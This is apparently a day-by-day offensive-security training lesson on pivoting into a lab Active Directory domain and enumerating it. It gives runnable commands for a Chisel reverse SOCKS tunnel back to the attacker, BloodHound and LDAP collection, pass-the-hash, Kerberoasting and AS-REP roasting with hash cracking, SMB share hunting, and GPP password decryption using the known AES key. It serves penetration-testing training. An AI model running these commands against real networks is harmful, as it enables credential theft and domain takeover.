---
title: "Phase 4 — Pivoting and Active Directory Recon"
tags: [ghost-level, active-directory, pivoting, bloodhound, ldap-enum,
  kerberos, module-11-ghost-level]
module: 11-GhostLevel
day: 714
prerequisites:
  - Day 713 — Phase 3: Binary Exploitation
  - Day 525 — Active Directory Fundamentals
  - Day 710 — Phase 2: Post-Web-Exploitation
related_topics:
  - Day 715 — Phase 4: AD Exploitation
---

# Day 714 — Phase 4: Pivoting and Active Directory Recon

> "A pivot is not a technique — it is a mindset shift. You stop thinking
> 'I am on this machine' and start thinking 'I am in this network.'
> The machine is temporary. The network is the target."
>
> — Ghost

---

> **ENGAGEMENT CLOCK — CHECK IN**
> Time elapsed: _______ hours | Shells held: sable-web / sable-svc / both

---

## Goals

Establish a stable tunnel from your controlled hosts into the domain segment.
Enumerate `SABLE.LOCAL` (10.0.1.30) using BloodHound collection and raw LDAP
queries. Map the attack path from current access to Domain Admin. Identify
Kerberoastable accounts and AS-REP roastable users before moving to Day 715.

**Target time:** 3 hours.

---

## 1 — Tunnel Consolidation

Before touching the DC, make sure your pivot is stable and multi-hop capable.

```bash
# ─── Verify existing pivot ────────────────────────────────────────────
proxychains nmap -sn 10.0.1.0/24 2>/dev/null | grep "Nmap scan report"

# ─── If pivot is down: re-establish Chisel reverse SOCKS ─────────────
# On attacker (start server):
./chisel server -p 8888 --reverse --socks5

# On sable-web or sable-svc (start client — picks up from existing shell):
./chisel client 10.0.2.10:8888 R:1080:socks &

# ─── /etc/proxychains.conf ────────────────────────────────────────────
# socks5 127.0.0.1 1080

# ─── Test pivot to sable-dc ───────────────────────────────────────────
proxychains nmap -p 53,88,135,139,389,445,636,3268,3389 10.0.1.30 \
    --open -Pn -T4 2>/dev/null
```

```
PIVOT STATUS

Tunnel type: SSH SOCKS / Chisel SOCKS / other: ___________________
Tunnel from: sable-web (10.0.1.10) / sable-svc (10.0.1.20) / both
sable-dc (10.0.1.30) reachable: Y / N

Port scan of sable-dc:
  88  (Kerberos):   open / closed
  389 (LDAP):       open / closed
  445 (SMB):        open / closed
  3268 (GlobalCat): open / closed
  3389 (RDP):       open / closed

Domain confirmed: SABLE.LOCAL  Y / N
```

---

## 2 — BloodHound Data Collection

```bash
# ─── Method A: SharpHound (from a Windows machine or via wine) ────────
# Download SharpHound.exe to sable-web if it is a Windows box
# Or run SharpHound via impacket-ntlmrelayx -smb2support if you have hash

# ─── Method B: BloodHound.py (Python, runs through proxychains) ───────
# Install: pip3 install bloodhound
# Syntax: bloodhound-python -u <user> -p <pass> -d SABLE.LOCAL \
#           -ns 10.0.1.30 -c All --zip

# If you have valid domain credentials (from sable-web DB or JWT key):
proxychains bloodhound-python \
    -u "sable_app" -p "<found_password>" \
    -d SABLE.LOCAL -ns 10.0.1.30 \
    -c All --zip \
    -o recon/bloodhound/

# If you only have a machine account hash (pass-the-hash):
proxychains bloodhound-python \
    -u "SABLE-WEB$" --hashes :<NT_hash> \
    -d SABLE.LOCAL -ns 10.0.1.30 \
    -c All --zip -o recon/bloodhound/
```

```bash
# ─── Load into BloodHound (on attacker) ──────────────────────────────
# Start Neo4j: sudo neo4j start
# Start BloodHound GUI: ./BloodHound --no-sandbox

# In BloodHound GUI: Upload Data → select the .zip
# Queries to run immediately:
#   1. "Find All Domain Admins"
#   2. "Find Shortest Paths to Domain Admins"
#   3. "Kerberoastable Accounts"
#   4. "AS-REP Roastable Users"
#   5. "Computers with Unconstrained Delegation"
```

```
BLOODHOUND COLLECTION

Collection successful: Y / N
Output file: recon/bloodhound/__________.zip
Loaded into BloodHound: Y / N

ATTACK PATH ANALYSIS (from BloodHound queries):

Shortest path to Domain Admin:
  Current user/machine → ______________ → ______________ → Domain Admin
  Steps: ______
  Edge types: GenericAll / WriteDACL / HasSession / MemberOf / CanRBCD

Kerberoastable accounts:
  Account 1: __________________ SPN: ___________________________
  Account 2: __________________ SPN: ___________________________

AS-REP Roastable users (no pre-auth required):
  User 1: ___________________
  User 2: ___________________

Computers with unconstrained delegation:
  Host 1: ___________________
  Host 2: ___________________
```

---

## 3 — Raw LDAP Enumeration

BloodHound gives the graph. LDAP gives the raw data. Both.

```bash
# ─── Anonymous LDAP query (does DC allow anonymous?) ─────────────────
proxychains ldapsearch -x -h 10.0.1.30 -b "DC=SABLE,DC=LOCAL" \
    "(objectClass=*)" dn 2>/dev/null | head -20

# ─── Authenticated LDAP enumeration ──────────────────────────────────
proxychains ldapsearch -x -h 10.0.1.30 \
    -D "CN=sable_app,CN=Users,DC=SABLE,DC=LOCAL" \
    -w "<password>" \
    -b "DC=SABLE,DC=LOCAL" \
    "(objectClass=user)" \
    sAMAccountName userPrincipalName memberOf pwdLastSet \
    badPasswordCount description \
    2>/dev/null | tee recon/ldap_users.txt

# ─── Find accounts with password in description ───────────────────────
grep -i "description" recon/ldap_users.txt | grep -iv "^#" | head -20

# ─── Enumerate domain groups ──────────────────────────────────────────
proxychains ldapsearch -x -h 10.0.1.30 \
    -D "CN=sable_app,CN=Users,DC=SABLE,DC=LOCAL" \
    -w "<password>" \
    -b "DC=SABLE,DC=LOCAL" \
    "(objectClass=group)" cn member \
    2>/dev/null | tee recon/ldap_groups.txt

# ─── Find Domain Admins membership ───────────────────────────────────
grep -A 20 "Domain Admins" recon/ldap_groups.txt | head -25

# ─── impacket alternative (through proxychains) ──────────────────────
proxychains python3 /usr/share/doc/python3-impacket/examples/GetADUsers.py \
    -all SABLE.LOCAL/sable_app:<password> \
    -dc-ip 10.0.1.30 2>/dev/null | tee recon/ad_users.txt
```

```
LDAP ENUMERATION RESULTS

Anonymous bind allowed: Y / N

Domain users found: _______ total
Privileged accounts:
  Domain Admins:   _______________________________________________
  Enterprise Admins: ____________________________________________
  Backup Operators: _____________________________________________
  Account Operators: ____________________________________________

Interesting account descriptions (password hints):
  Account: _________________ Description: ______________________

Service accounts (SPNs):
  Account: _________________ SPN: _____________________________
  Account: _________________ SPN: _____________________________

Accounts with old passwords (pwdLastSet > 90 days):
  _______________________________________________________________
```

---

## 4 — Kerberos Enumeration

```bash
# ─── SPN enumeration (Kerberoasting targets) ─────────────────────────
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    SABLE.LOCAL/sable_app:<password> \
    -dc-ip 10.0.1.30 \
    2>/dev/null | tee recon/spns.txt

# Request TGS tickets for all SPNs (for offline cracking)
proxychains python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py \
    SABLE.LOCAL/sable_app:<password> \
    -dc-ip 10.0.1.30 -request \
    -outputfile recon/kerberoast_hashes.txt \
    2>/dev/null

# ─── AS-REP roasting (accounts with pre-auth disabled) ───────────────
proxychains python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
    SABLE.LOCAL/ -dc-ip 10.0.1.30 \
    -usersfile recon/ad_users_list.txt \
    -format hashcat -outputfile recon/asrep_hashes.txt \
    2>/dev/null

# If you have no user list yet: use a wordlist approach
proxychains python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py \
    SABLE.LOCAL/ -dc-ip 10.0.1.30 \
    -no-pass -request \
    -usersfile /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
    2>/dev/null | grep "\$krb5asrep\$"

# ─── Offline hash cracking ────────────────────────────────────────────
# Kerberoast (TGS-REP, mode 13100):
hashcat -m 13100 recon/kerberoast_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    --rules-file /usr/share/hashcat/rules/best64.rule \
    -o recon/kerberoast_cracked.txt

# AS-REP roast (mode 18200):
hashcat -m 18200 recon/asrep_hashes.txt \
    /usr/share/wordlists/rockyou.txt \
    -o recon/asrep_cracked.txt
```

```
KERBEROS ENUMERATION RESULTS

KERBEROASTING:
  SPNs found: _______
  Hash file: recon/kerberoast_hashes.txt
  Cracked passwords:
    Account: _________________ Password: _______________________
    Account: _________________ Password: _______________________

AS-REP ROASTING:
  Vulnerable users: _______
  Hash file: recon/asrep_hashes.txt
  Cracked passwords:
    Account: _________________ Password: _______________________

Any credentials usable for DA path: Y / N
```

---

## 5 — SMB Enumeration

```bash
# ─── List shares ──────────────────────────────────────────────────────
proxychains crackmapexec smb 10.0.1.30 \
    -u "sable_app" -p "<password>" --shares

# ─── List logged-on users (find DA session) ──────────────────────────
proxychains crackmapexec smb 10.0.1.30 \
    -u "sable_app" -p "<password>" --loggedon-users

# ─── Check for writable shares ───────────────────────────────────────
proxychains smbclient -L //10.0.1.30 \
    -U "SABLE/sable_app%<password>" 2>/dev/null

# ─── Look for sensitive files in SYSVOL / NETLOGON ───────────────────
proxychains smbclient //10.0.1.30/SYSVOL \
    -U "SABLE/sable_app%<password>" \
    -c "recurse; ls" 2>/dev/null | head -30

# ─── GPP password hunt (Group Policy Preferences — CVE-2014-1812) ────
proxychains python3 - << 'EOF'
import os, impacket
# Or use: Get-GPPPassword from PowerSploit
# Or: proxychains smbclient //10.0.1.30/SYSVOL -c "get Groups.xml"
# Then: python3 -c "
#   import base64, hashlib, Crypto.Cipher.AES as A
#   key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8'
#          b'\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'
#   ct = base64.b64decode('<cPassword value from XML>')
#   # AES256 CBC, null IV
#   print(A.new(key, A.MODE_CBC, b'\x00'*16).decrypt(ct))"
print("GPP search complete — check SYSVOL manually for Groups.xml")
EOF
```

```
SMB ENUMERATION RESULTS

Shares accessible:
  SYSVOL:  readable Y / N    writable Y / N
  NETLOGON: readable Y / N
  Other: __________________  readable Y / N

Logged-on users on sable-dc:
  Administrator: Y / N   Session type: ____________________
  Other admins: ___________________________________________

GPP passwords found: Y / N
  Decrypted password: _____________________________________

Files of interest in SYSVOL:
  _______________________________________________________________
```

---

## 6 — Attack Path Summary

```
AD RECON — PHASE 4 SUMMARY

Domain: SABLE.LOCAL
DC: sable-dc (10.0.1.30)  OS: _________________________________

Current accounts under control:
  1. _________________ (from sable-web exploit)
  2. _________________ (Kerberoasted)
  3. _________________ (AS-REP roasted)

Shortest path to Domain Admin:
  Method: ___________________________________________________
  Via: ______________________________________________________

Privilege escalation path chosen for Day 715:
  [ ] Kerberoast + crack → lateral move → DA
  [ ] AS-REP roast → high-priv account → DA
  [ ] DCSync from existing high-priv account
  [ ] BloodHound edge: ______________________________________
  [ ] Pass-the-hash / Pass-the-ticket

Credentials ready for Day 715:
  Account: ______________________  Password/Hash: ____________
  Privilege level: ___________________________________________
```

---

## Navigation

← Previous: [Day 713 — Phase 3: Binary Exploitation](DAY-0713-Phase3-Binary-Exploitation.md)
→ Next: [Day 715 — Phase 4: Active Directory Exploitation](DAY-0715-Phase4-AD-Exploitation.md)
